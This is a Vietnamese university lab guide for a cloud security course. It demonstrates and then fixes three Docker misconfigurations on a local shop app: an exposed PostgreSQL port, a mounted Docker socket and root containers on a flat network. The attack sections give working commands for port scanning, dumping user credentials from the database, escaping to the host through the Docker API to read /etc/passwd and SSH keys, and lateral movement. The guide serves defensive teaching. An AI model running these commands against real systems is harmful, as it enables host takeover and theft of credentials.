# 🔐 HƯỚNG DẪN DEMO 3 LỖ HỔNG BẢO MẬT
## Môn học: An Toàn Điện Toán Đám Mây
### Tiểu luận: Tự triển khai web server nhỏ bằng Docker và mô phỏng lỗ hổng cấu hình
**Sinh viên:** Nguyễn Văn Tân – MSSV: 22004329  
**GVHD:** ThS. Trần Thái Bảo  
**Trường:** ĐH Sư Phạm Kỹ Thuật Vĩnh Long

---

## 📋 MỤC LỤC

1. [Tổng quan hệ thống](#1-tổng-quan-hệ-thống)
2. [Chuẩn bị môi trường demo](#2-chuẩn-bị-môi-trường-demo)
3. [LỖ HỔNG 1 – PostgreSQL Exposure (CVSS 8.8 High)](#3-lỗ-hổng-1--postgresql-exposure-cvss-88-high)
4. [LỖ HỔNG 2 – Docker Socket Exposure (CVSS 9.8 Critical)](#4-lỗ-hổng-2--docker-socket-exposure-cvss-98-critical)
5. [LỖ HỔNG 3 – Container chạy quyền Root + Flat Network (CVSS 8.6 High)](#5-lỗ-hổng-3--container-chạy-quyền-root--flat-network-cvss-86-high)
6. [Khắc phục & Hardening](#6-khắc-phục--hardening)
7. [So sánh trước và sau](#7-so-sánh-trước-và-sau)

---

## 1. TỔNG QUAN HỆ THỐNG

Hệ thống demo là một ứng dụng web thương mại điện tử (Gift Shop) chạy trên Docker với kiến trúc 3 tầng:

```
Internet → [Nginx Container] → [Laravel/PHP-FPM Container] → [PostgreSQL Container]
```

| Container | Image | Vai trò |
|-----------|-------|---------|
| `gift_nginx` | nginx:alpine | Web Server + Reverse Proxy |
| `gift_app` | php:8.5-fpm (custom) | Laravel Application |
| `gift_shop_db` | postgres:16-alpine | Cơ sở dữ liệu |

---

## 2. CHUẨN BỊ MÔI TRƯỜNG DEMO

### 2.1 Yêu cầu hệ thống
- Docker Desktop đã cài đặt (v28.x+)
- Docker Compose v2.x
- Công cụ: `nmap`, `psql` (PostgreSQL client), terminal

### 2.2 Kiểm tra Docker đang chạy
```bash
docker --version
docker compose version
docker ps
```

### 2.3 Clone/Mở dự án
```bash
# Đi vào thư mục dự án
cd d:\projects\gift-shop

# Xem cấu trúc file cấu hình
dir
```

### 2.4 Hai file cấu hình quan trọng

| File | Mục đích |
|------|----------|
| `docker-compose.insecure.yml` | Cấu hình **CÓ LỖ HỔNG** – dùng để demo tấn công |
| `docker-compose.yml` | Cấu hình **ĐÃ BẢO MẬT** – sau khi hardening |

---

## 3. LỖ HỔNG 1 – PostgreSQL Exposure (CVSS 8.8 High)

### 🔴 Mô tả lỗ hổng
Cổng **5432** của PostgreSQL được map trực tiếp ra ngoài (`ports: "5432:5432"`), cho phép bất kỳ máy nào trên mạng kết nối trực tiếp vào cơ sở dữ liệu, **bypass hoàn toàn Nginx và Laravel**.

### 📊 Đánh giá CVSS v3.1

| Thành phần | Giá trị | Giải thích |
|-----------|---------|-----------|
| Attack Vector (AV) | **Network (N)** | Khai thác từ bất kỳ đâu trên mạng |
| Attack Complexity (AC) | **Low (L)** | Không cần kỹ thuật phức tạp |
| Privileges Required (PR) | **Low (L)** | Chỉ cần biết IP và thông tin đăng nhập |
| User Interaction (UI) | **None (N)** | Hoàn toàn tự động |
| Scope (S) | **Unchanged (U)** | Ảnh hưởng trong phạm vi DB |
| Confidentiality (C) | **High (H)** | Toàn bộ dữ liệu bị lộ |
| Integrity (I) | **High (H)** | Có thể xóa/sửa dữ liệu |
| Availability (A) | **High (H)** | Có thể làm DB ngừng hoạt động |
| **CVSS Score** | **8.8 (HIGH)** | |

---

### 🔴 PHẦN A: DEMO LỖ HỔNG

#### Bước A1 – Khởi động hệ thống CÓ LỖ HỔNG

```bash
# Dừng mọi container đang chạy trước
docker compose down

# Khởi động với file cấu hình CÓ LỖ HỔNG
docker compose -f docker-compose.insecure.yml up -d

# Kiểm tra container đang chạy
docker ps
```

**Kết quả mong đợi:**
```
CONTAINER ID   IMAGE              COMMAND       STATUS    PORTS
abc123         postgres:16-alpine "docker-e..."  Up        0.0.0.0:5432->5432/tcp   ← PORT LỘ RA NGOÀI
def456         nginx:alpine       "/docker-..."  Up        0.0.0.0:8080->80/tcp
```

> ⚠️ Chú ý dòng `0.0.0.0:5432->5432/tcp` – đây là dấu hiệu lỗ hổng!

---

#### Bước A2 – Quét cổng bằng Nmap

```bash
# Quét cổng của máy host
nmap -sV localhost

# Hoặc quét cụ thể cổng 5432
nmap -p 5432 localhost
```

**Kết quả mong đợi (thấy lỗ hổng):**
```
PORT     STATE SERVICE    VERSION
5432/tcp open  postgresql PostgreSQL DB 16.x
8080/tcp open  http       nginx
```

> 🚨 Cổng 5432 của PostgreSQL đang MỞ và có thể bị phát hiện!

---

#### Bước A3 – Kết nối trực tiếp vào Database (không cần qua ứng dụng)

```bash
# Kết nối trực tiếp vào PostgreSQL từ bên ngoài
# (giả lập kẻ tấn công kết nối từ máy khác)
psql -h localhost -p 5432 -U gift_shop_user -d gift_shop

# Nếu không có psql, dùng Docker để chạy client
docker run --rm -it postgres:16-alpine psql -h host.docker.internal -p 5432 -U gift_shop_user -d gift_shop
```

**Khi được hỏi password, nhập:** `secret123`

**Sau khi vào được database, demo các lệnh nguy hiểm:**
```sql
-- Xem tất cả bảng dữ liệu
\dt

-- Đọc dữ liệu người dùng (vi phạm Confidentiality)
SELECT * FROM users LIMIT 10;

-- Xem thông tin nhạy cảm
SELECT email, password FROM users;

-- Demo xóa dữ liệu (vi phạm Integrity - CHỈ DEMO, KHÔNG THỰC HIỆN THẬT)
-- DELETE FROM users WHERE id = 1;

-- Thoát
\q
```

---

#### Bước A4 – Giải thích tác động CIA Triad

```
🔴 CONFIDENTIALITY (Tính bảo mật):
   → Toàn bộ dữ liệu người dùng, đơn hàng, thông tin kinh doanh bị lộ

🔴 INTEGRITY (Tính toàn vẹn):
   → Kẻ tấn công có thể sửa giá sản phẩm, xóa đơn hàng, tạo dữ liệu giả

🔴 AVAILABILITY (Tính sẵn sàng):
   → Kẻ tấn công có thể DROP TABLE hoặc thực hiện DoS làm DB quá tải
```

---

### 🟢 PHẦN B: KHẮC PHỤC LỖ HỔNG 1

#### Giải pháp: Xóa `ports` của PostgreSQL trong docker-compose

**Trước (CÓ LỖ HỔNG):**
```yaml
# docker-compose.insecure.yml
postgres:
  image: postgres:16-alpine
  ports:
    - "5432:5432"  # ← LỖ HỔNG: Map cổng ra ngoài
```

**Sau (ĐÃ BẢO MẬT):**
```yaml
# docker-compose.yml
postgres:
  image: postgres:16-alpine
  # KHÔNG có dòng ports → cổng 5432 chỉ nội bộ Docker
  networks:
    - backend_net  # Chỉ trong mạng nội bộ
```

#### Demo sau khi khắc phục:
```bash
# Dừng hệ thống CÓ LỖ HỔNG
docker compose -f docker-compose.insecure.yml down

# Khởi động với file ĐÃ BẢO MẬT
docker compose up -d

# Quét lại cổng
nmap -p 5432 localhost
```

**Kết quả sau hardening:**
```
PORT     STATE    SERVICE
5432/tcp filtered postgresql   ← KHÔNG CÒN THẤY NỮA!
```

---

## 4. LỖ HỔNG 2 – Docker Socket Exposure (CVSS 9.8 Critical)

### 🔴 Mô tả lỗ hổng
File `/var/run/docker.sock` (Unix Socket) là **điểm kiểm soát toàn bộ Docker Engine**. Khi mount file này vào container, container đó có khả năng **kiểm soát toàn bộ Docker Host** – tạo container mới, xóa container, truy cập file trên host, thậm chí chiếm quyền hệ điều hành.

### 📊 Đánh giá CVSS v3.1

| Thành phần | Giá trị | Giải thích |
|-----------|---------|-----------|
| Attack Vector (AV) | **Network (N)** | Khai thác qua mạng |
| Attack Complexity (AC) | **Low (L)** | Dễ khai thác |
| Privileges Required (PR) | **Low (L)** | Quyền user thông thường |
| User Interaction (UI) | **None (N)** | Hoàn toàn tự động |
| Scope (S) | **Changed (C)** | ⭐ Ảnh hưởng VƯỢT ra khỏi container |
| Confidentiality (C) | **High (H)** | Toàn bộ file host bị lộ |
| Integrity (I) | **High (H)** | Có thể thay đổi toàn bộ hệ thống |
| Availability (A) | **High (H)** | Có thể tắt toàn bộ dịch vụ |
| **CVSS Score** | **9.8 (CRITICAL)** | ⭐ Nguy hiểm nhất! |

> **Lưu ý quan trọng:** `Scope = Changed` có nghĩa là lỗ hổng này VƯỢT QUA ranh giới bảo mật container, ảnh hưởng đến **toàn bộ Docker Host**.

---

### 🔴 PHẦN A: DEMO LỖ HỔNG

#### Bước A1 – Tạo cấu hình có Docker Socket Exposure

Tạo file `docker-compose.socket-demo.yml`:

```yaml
# File demo Docker Socket Exposure
services:
  app-vulnerable:
    image: php:8.2-fpm
    container_name: app_with_socket
    volumes:
      - ./php:/var/www/html
      - /var/run/docker.sock:/var/run/docker.sock  # ← LỖ HỔNG!
    ports:
      - "9001:9000"
```

```bash
# Khởi động container có lỗ hổng
docker compose -f docker-compose.socket-demo.yml up -d

# Kiểm tra container
docker ps
```

---

#### Bước A2 – Vào trong container và kiểm soát Docker Host

```bash
# Vào bên trong container bị lỗ hổng
docker exec -it app_with_socket bash

# Kiểm tra Docker socket có tồn tại không
ls -la /var/run/docker.sock

# Kết quả mong đợi:
# srw-rw---- 1 root docker ... /var/run/docker.sock   ← SOCKET ĐÃ MOUNT VÀO!
```

---

#### Bước A3 – Từ trong container, kiểm soát Docker Host

```bash
# Vẫn đang trong container, cài docker client
apt-get update -q && apt-get install -y -q docker.io curl 2>/dev/null || true

# Hoặc sử dụng curl để gọi Docker API trực tiếp
curl --unix-socket /var/run/docker.sock http://localhost/version

# Xem tất cả container đang chạy trên HOST từ bên trong container
curl --unix-socket /var/run/docker.sock http://localhost/containers/json | python3 -m json.tool
```

**Kết quả mong đợi:**
```json
[
  {
    "Id": "abc123...",
    "Names": ["/gift_shop_db"],
    "Image": "postgres:16-alpine",
    "Status": "running"
  },
  ...
]
```

> 🚨 Từ bên trong container, kẻ tấn công có thể thấy TẤT CẢ container trên host!

---

#### Bước A4 – Demo Container Escape (Chiếm quyền Host)

```bash
# Vẫn đang trong container có socket
# Tạo một container mới với quyền truy cập toàn bộ filesystem của host
curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["sh", "-c", "cat /host/etc/passwd"],
    "Binds": ["/:/host"],
    "HostConfig": {
      "Binds": ["/:/host"]
    }
  }'

# Lấy ID từ kết quả trên, rồi start container đó
# curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/{ID}/start
```

**Giải thích:** Kẻ tấn công tạo container mới mount toàn bộ filesystem `/` của host vào `/host`, từ đó đọc được mọi file nhạy cảm:
- `/host/etc/passwd` – danh sách user
- `/host/root/.ssh/id_rsa` – SSH private key
- `/host/var/www/html/.env` – credentials của ứng dụng

---

#### Bước A5 – Kiểm tra từ góc độ người dùng bình thường

```bash
# Thoát khỏi container
exit

# Container bình thường (KHÔNG có socket) – thử làm điều tương tự
docker exec -it gift_app bash

# Kiểm tra socket có tồn tại không
ls /var/run/docker.sock
# Kết quả: ls: cannot access '/var/run/docker.sock': No such file or directory
```

---

#### Bước A6 – Giải thích tác động CIA Triad

```
🔴 CONFIDENTIALITY (Tính bảo mật) – CRITICAL:
   → Đọc được file .env chứa DB password, API keys, SECRET_KEY
   → Đọc được SSH private keys
   → Truy cập volume của PostgreSQL, lấy trực tiếp raw data

🔴 INTEGRITY (Tính toàn vẹn) – CRITICAL:
   → Sửa đổi mã nguồn ứng dụng (chèn backdoor)
   → Thay đổi cấu hình hệ điều hành
   → Tạo user mới với quyền root

🔴 AVAILABILITY (Tính sẵn sàng) – CRITICAL:
   → Xóa toàn bộ container, image, volume
   → Tắt Docker Engine
   → Chiếm tài nguyên CPU/RAM gây DoS
```

---

### 🟢 PHẦN B: KHẮC PHỤC LỖ HỔNG 2

**Trước (CÓ LỖ HỔNG):**
```yaml
app:
  volumes:
    - /var/run/docker.sock:/var/run/docker.sock  # ← NGUY HIỂM!
```

**Sau (ĐÃ BẢO MẬT):**
```yaml
app:
  volumes:
    - .:/var/www/html           # Chỉ mount mã nguồn
    - /var/www/html/vendor      # Vendor không cần mount
    # KHÔNG mount docker.sock!
```

#### Lệnh kiểm tra sau khắc phục:
```bash
# Vào container đã bảo mật
docker exec -it gift_app bash

# Kiểm tra – socket không tồn tại
ls /var/run/docker.sock
# Output: ls: cannot access '/var/run/docker.sock': No such file or directory ✓

# Thoát
exit
```

#### Thêm các biện pháp bảo vệ khác:
```yaml
# docker-compose.yml – Hardening thêm
app:
  security_opt:
    - no-new-privileges:true      # Ngăn leo thang đặc quyền
  read_only: true                  # Filesystem chỉ đọc
  cap_drop:
    - ALL                          # Drop tất cả capabilities
  cap_add:
    - NET_BIND_SERVICE             # Chỉ thêm capability cần thiết
```

---

## 5. LỖ HỔNG 3 – Container chạy quyền Root + Flat Network (CVSS 8.6 High)

### 🔴 Mô tả lỗ hổng
**Lỗ hổng kép** gồm hai vấn đề:
1. **Container Root**: Mặc định container chạy với `uid=0` (root), nếu bị khai thác → kẻ tấn công có toàn quyền trong container
2. **Flat Network**: Tất cả container trong cùng một mạng bridge mặc định, có thể nói chuyện trực tiếp với nhau → tạo điều kiện cho **lateral movement** (tấn công di chuyển ngang)

### 📊 Đánh giá CVSS v3.1

| Thành phần | Giá trị | Giải thích |
|-----------|---------|-----------|
| Attack Vector (AV) | **Network (N)** | Khai thác từ mạng |
| Attack Complexity (AC) | **Low (L)** | Không phức tạp |
| Privileges Required (PR) | **Low (L)** | Quyền thấp là đủ |
| User Interaction (UI) | **None (N)** | Tự động |
| Scope (S) | **Unchanged (U)** | Trong phạm vi Docker containers |
| Confidentiality (C) | **High (H)** | Dữ liệu toàn hệ thống bị lộ |
| Integrity (I) | **High (H)** | Có thể sửa code, config |
| Availability (A) | **High (H)** | Gây gián đoạn dịch vụ |
| **CVSS Score** | **8.6 (HIGH)** | |

---

### 🔴 PHẦN A: DEMO LỖ HỔNG

#### Bước A1 – Demo Container chạy quyền Root

```bash
# Khởi động hệ thống với cấu hình CÓ LỖ HỔNG
docker compose -f docker-compose.insecure.yml up -d

# Vào container app và kiểm tra user đang chạy
docker exec -it gift_app whoami

# Hoặc
docker exec -it gift_app id
```

**Kết quả (thấy lỗ hổng):**
```
root
uid=0(root) gid=0(root) groups=0(root)
```

> 🚨 Container đang chạy với quyền **root** – nguy hiểm!

---

#### Bước A2 – Demo những gì kẻ tấn công CÓ THỂ làm với quyền Root

```bash
# Vào container với quyền root
docker exec -it gift_app bash

# Đọc file nhạy cảm
cat /var/www/html/.env

# Liệt kê tất cả file trong hệ thống
find / -name "*.env" 2>/dev/null
find / -name "*.key" 2>/dev/null

# Kiểm tra quyền trên thư mục quan trọng
ls -la /var/www/html/

# Cài đặt công cụ tấn công (vì có quyền root)
apt-get install -y nmap netcat-openbsd 2>/dev/null

# Thoát
exit
```

---

#### Bước A3 – Demo Flat Network (tất cả container thấy nhau)

```bash
# Vào container app (đang dùng Flat Network)
docker exec -it gift_app bash

# Kiểm tra mạng hiện tại
cat /etc/hosts
ip route show

# Thử ping tới container PostgreSQL (tên service hoặc IP)
ping -c 3 postgres   # hoặc tên container gift_shop_db

# Quét cổng của PostgreSQL từ container app
# (Cài nmap trước nếu chưa có - CHỈ DEMO)
apt-get install -y nmap -q 2>/dev/null
nmap -p 5432 gift_shop_db
```

**Kết quả mong đợi (thấy lỗ hổng):**
```
Nmap scan report for gift_shop_db (172.x.x.x)
PORT     STATE SERVICE
5432/tcp open  postgresql
```

> 🚨 Container App có thể QUÉT và KẾT NỐI TRỰC TIẾP tới PostgreSQL!

---

#### Bước A4 – Demo kịch bản tấn công Lateral Movement

**Kịch bản:** Giả sử kẻ tấn công đã khai thác được lỗ hổng trong Laravel (ví dụ: RCE qua file upload), và đang có quyền root trong container `gift_app`.

```bash
# Giả lập kẻ tấn công đã vào được container
docker exec -it gift_app bash

# BƯỚC 1: Quét mạng để tìm các container khác
ip route show
# Thấy network 172.x.x.0/16

# BƯỚC 2: Phát hiện PostgreSQL trong cùng mạng
ping -c 1 gift_shop_db    # Hoặc ping -c 1 postgres
# Kết quả: PING thành công → DB có thể kết nối

# BƯỚC 3: Kết nối thẳng vào DB (vì flat network không có rào cản)
# Trong môi trường thực, kẻ tấn công dùng credentials từ .env đã đọc
# POSTGRES_USER=gift_shop_user, POSTGRES_PASSWORD=secret123

# BƯỚC 4: Trích xuất dữ liệu
apt-get install -y postgresql-client -q 2>/dev/null
psql -h gift_shop_db -U gift_shop_user -d gift_shop -c "SELECT * FROM users;"

# Thoát
exit
```

---

#### Bước A5 – So sánh: Flat Network vs. Phân tách mạng

**Flat Network (LỖ HỔNG):**
```
Internet → Nginx → [TẤT CẢ CONTAINER TRONG CÙNG 1 MẠNG]
                   ├── gift_app (PHP)    ←→ gift_shop_db (PostgreSQL)
                   └── gift_shop_db                ↑
                                            Trực tiếp, không kiểm soát!
```

**Phân tách mạng (BẢO MẬT):**
```
Internet → Nginx (frontend_net) → gift_app (backend_net) → PostgreSQL (backend_net)
           [Chỉ Nginx ra ngoài]  [App + DB nội bộ]         [DB cô lập hoàn toàn]
```

---

#### Bước A6 – Giải thích tác động CIA Triad

```
🔴 CONFIDENTIALITY (Tính bảo mật):
   → Quyền root + flat network → kẻ tấn công đọc .env, SSH keys
   → Quét mạng nội bộ, phát hiện PostgreSQL
   → Kết nối thẳng vào DB, lấy toàn bộ dữ liệu

🔴 INTEGRITY (Tính toàn vẹn):
   → Sửa mã nguồn ứng dụng (chèn backdoor, web shell)
   → Thay đổi dữ liệu trong database
   → Cài malware vì có quyền root

🔴 AVAILABILITY (Tính sẵn sàng):
   → Xóa dữ liệu, làm hỏng DB
   → Tiêu thụ tài nguyên CPU/RAM
   → Tấn công các container khác trong flat network
```

---

### 🟢 PHẦN B: KHẮC PHỤC LỖ HỔNG 3

#### Khắc phục 1: Chuyển sang Non-Root User (Dockerfile)

**Trước (CÓ LỖ HỔNG) – Dockerfile:**
```dockerfile
FROM php:8.5-fpm
# ... cài đặt ...
# KHÔNG khai báo USER → chạy root mặc định!
CMD ["php-fpm"]
```

**Sau (ĐÃ BẢO MẬT) – Dockerfile:**
```dockerfile
FROM php:8.5-fpm
# ... cài đặt ...

# Tạo user không có quyền root
RUN addgroup --gid 1000 appgroup && \
    adduser --uid 1000 --gid 1000 --disabled-password --gecos "" appuser

# Chuyển sang non-root user
USER appuser

CMD ["php-fpm"]
```

#### Demo kiểm tra sau khi sửa Dockerfile:
```bash
# Rebuild image với non-root user
docker compose build app

# Chạy lại
docker compose up -d

# Kiểm tra user
docker exec -it gift_app whoami
# Output: appuser   ← KHÔNG CÒN là root!

docker exec -it gift_app id
# Output: uid=1000(appuser) gid=1000(appgroup) groups=1000(appgroup)
```

---

#### Khắc phục 2: Phân tách mạng Docker (docker-compose.yml)

**Trước (CÓ LỖ HỔNG) – Flat Network:**
```yaml
# docker-compose.insecure.yml
services:
  app:
    image: php:8.2-fpm
    # KHÔNG khai báo networks → flat network mặc định

  nginx:
    image: nginx:alpine
    # KHÔNG khai báo networks → flat network mặc định

  postgres:
    image: postgres:16-alpine
    # KHÔNG khai báo networks → flat network mặc định
```

**Sau (ĐÃ BẢO MẬT) – Phân tách mạng:**
```yaml
# docker-compose.yml
services:
  nginx:
    networks:
      - frontend_net   # Chỉ trong frontend

  app:
    networks:
      - frontend_net   # Nhận từ nginx
      - backend_net    # Kết nối DB

  postgres:
    networks:
      - backend_net    # CHỈ backend, KHÔNG ra ngoài

networks:
  frontend_net:
    driver: bridge
  backend_net:
    driver: bridge
    internal: true   # Hoàn toàn nội bộ, không ra internet
```

#### Demo kiểm tra sau khi phân tách mạng:
```bash
# Khởi động với cấu hình ĐÃ BẢO MẬT
docker compose up -d

# Vào container nginx – thử kết nối đến PostgreSQL
docker exec -it gift_nginx sh
ping gift_shop_db
# Kết quả: ping: gift_shop_db: Name or service not known  ← KHÔNG THỂ THẤY!

exit

# Vào container app – được kết nối DB (vì trong backend_net)
docker exec -it gift_app bash
ping gift_shop_db
# Kết quả: PING thành công (đúng, app cần kết nối DB)

exit
```

---

## 6. KHẮC PHỤC & HARDENING

### Tổng hợp các lệnh kiểm tra sau khi hardening

```bash
# 1. Khởi động hệ thống ĐÃ BẢO MẬT
docker compose -f docker-compose.insecure.yml down
docker compose up -d --build

# 2. Kiểm tra tất cả container đang chạy
docker ps --format "table {{.Names}}\t{{.Image}}\t{{.Status}}\t{{.Ports}}"

# 3. Kiểm tra cổng bị lộ (5432 phải KHÔNG thấy)
nmap -p 5432,8080,80 localhost

# 4. Kiểm tra user trong container
docker exec gift_app whoami        # Phải ra: www-data hoặc appuser (không phải root)

# 5. Kiểm tra Docker Socket không tồn tại trong container
docker exec gift_app ls /var/run/docker.sock 2>&1

# 6. Kiểm tra phân tách mạng
docker network ls
docker network inspect gift-shop_frontend_net
docker network inspect gift-shop_backend_net

# 7. Kiểm tra nginx không thấy DB
docker exec gift_nginx ping -c 1 gift_shop_db 2>&1
```

### File docker-compose.yml đã được bảo mật (tham khảo)

```yaml
services:
  app:
    build: .
    container_name: gift_app
    restart: unless-stopped
    working_dir: /var/www/html
    volumes:
      - .:/var/www/html
      - /var/www/html/vendor
    # KHÔNG mount docker.sock
    depends_on:
      - postgres
    networks:
      - frontend_net
      - backend_net
    deploy:
      resources:
        limits:
          cpus: "0.5"
          memory: 256M

  nginx:
    image: nginx:alpine
    container_name: gift_nginx
    restart: unless-stopped
    ports:
      - "8080:80"
    volumes:
      - .:/var/www/html
      - ./nginx/default.conf:/etc/nginx/conf.d/default.conf
    depends_on:
      - app
    networks:
      - frontend_net   # Chỉ frontend, không thấy DB

  postgres:
    image: postgres:16-alpine
    container_name: gift_shop_db
    restart: unless-stopped
    environment:
      POSTGRES_DB: gift_shop
      POSTGRES_USER: gift_shop_user
      POSTGRES_PASSWORD: secret123
    volumes:
      - postgres_data:/var/lib/postgresql/data
    # KHÔNG có ports → không lộ cổng 5432
    networks:
      - backend_net   # Chỉ backend nội bộ

volumes:
  postgres_data:

networks:
  frontend_net:
    driver: bridge
  backend_net:
    driver: bridge
    internal: true   # Không ra internet
```

---

## 7. SO SÁNH TRƯỚC VÀ SAU

### Bảng tổng hợp kết quả

| Tiêu chí | ⚠️ TRƯỚC khắc phục | ✅ SAU khắc phục |
|---------|-------------------|-----------------|
| **Cổng PostgreSQL** | 5432 lộ ra ngoài | Đóng, chỉ nội bộ Docker |
| **Docker Socket** | Mount vào container | Loại bỏ hoàn toàn |
| **User Container** | Chạy root (uid=0) | Non-root user (uid=1000) |
| **Mạng Docker** | Flat Network (tất cả thấy nhau) | frontend_net + backend_net riêng biệt |
| **Security Group** | Mở quá nhiều cổng | Default Deny, chỉ mở cần thiết |
| **Quyền file** | Có thể chmod 777 | chmod 600-755 cụ thể |
| **CVSS PostgreSQL** | 8.8 (High) | N/A (không còn tồn tại) |
| **CVSS Docker Socket** | 9.8 (Critical) | N/A (không còn tồn tại) |
| **CVSS Root+Flat Net** | 8.6 (High) | Giảm đáng kể |

### Đánh giá CIA Triad sau hardening

| Nguyên tắc | Trạng thái | Biện pháp |
|-----------|-----------|-----------|
| **Confidentiality** | ✅ Được cải thiện | DB cô lập, .env bảo vệ, non-root user |
| **Integrity** | ✅ Được cải thiện | Least Privilege, filesystem read-only |
| **Availability** | ✅ Được cải thiện | Phân tách mạng, giảm bề mặt tấn công |

---

## 📌 GHI CHÚ QUAN TRỌNG KHI DEMO

> ⚠️ **Lưu ý pháp lý và đạo đức:**
> - Tất cả demo này chỉ được thực hiện trên môi trường **lab cục bộ** của chính mình
> - Tuyệt đối **không** thực hiện các kỹ thuật này trên hệ thống của người khác
> - Mục đích duy nhất là học tập và nghiên cứu bảo mật phòng thủ

### Thứ tự demo đề xuất cho buổi báo cáo:

```
1. Giới thiệu hệ thống (2 phút)
   → Chạy: docker compose -f docker-compose.insecure.yml up -d
   → Hiển thị: docker ps

2. Demo Lỗ hổng 1 – PostgreSQL (5 phút)
   → nmap scan → psql kết nối → đọc dữ liệu → giải thích

3. Demo Lỗ hổng 2 – Docker Socket (5 phút)
   → docker exec → ls /var/run/docker.sock → curl Docker API → container escape

4. Demo Lỗ hổng 3 – Root + Flat Network (5 phút)
   → whoami → ping DB → kết nối DB từ app container → lateral movement

5. Demo Hardening (3 phút)
   → docker compose down → docker compose up -d --build
   → Kiểm tra lại: nmap, whoami, ping DB

6. Kết luận & Câu hỏi (5 phút)
```

---

## 📚 TÀI LIỆU THAM KHẢO

- [Docker Documentation](https://docs.docker.com)
- [OWASP Top 10:2025](https://owasp.org/www-project-top-ten/)
- [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker)
- [NIST CVSS v3.1 Calculator](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator)
- [NIST SP 800-190: Application Container Security Guide](https://csrc.nist.gov/publications/detail/sp/800-190/final)

---

*Tài liệu này được tạo cho mục đích học tập môn An Toàn Điện Toán Đám Mây.*  
*ĐH Sư Phạm Kỹ Thuật Vĩnh Long – Khoa CNTT – 2026*
